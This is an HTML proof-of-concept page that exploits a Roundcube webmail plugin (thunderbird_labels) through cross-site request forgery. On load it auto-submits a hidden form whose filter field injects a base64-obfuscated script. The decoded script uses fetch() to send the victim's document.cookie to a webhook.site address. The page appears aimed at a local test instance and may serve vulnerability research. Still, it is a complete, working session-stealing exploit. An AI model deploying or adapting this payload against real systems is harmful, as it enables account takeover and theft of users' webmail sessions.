<!DOCTYPE html>
<html>
<head>
    <title>CSRF Exploit</title>
</head>
<body>
    <h1>CSRF Exploit for Roundcube</h1>
    <form id="csrfForm" action="http://localhost:81/webmail/" method="GET">
        <input type="hidden" name="_task" value="mail" />
        <input type="hidden" name="_action" value="plugin.thunderbird_labels.set_filters" />
        <input type="hidden" name="_mbox" value="INBOX" />
        <input type="hidden" name="_filters" value="<script>eval(atob(&quot;ZmV0Y2goJ2h0dHBzOi8vd2ViaG9vay5zaXRlLzNkZWM5Zjk1LWJhMjUtNGZjOC05YjBkLWJmNjI5YWU2YWFkNj9xPScgKyAoZG9jdW1lbnQuY29va2llKSk=&quot;))</script>:0|Personal:0|To do:0|Later:0" />
        <input type="hidden" name="_remote" value="1" />
        <input type="hidden" name="_unlock" value="loading1748244824582" />
        <input type="hidden" name="_" value="1748244817388" />
    </form>

    <script>
        // Tự động gửi form khi trang được tải
        document.getElementById("csrfForm").submit();
    </script>
</body>
</html>
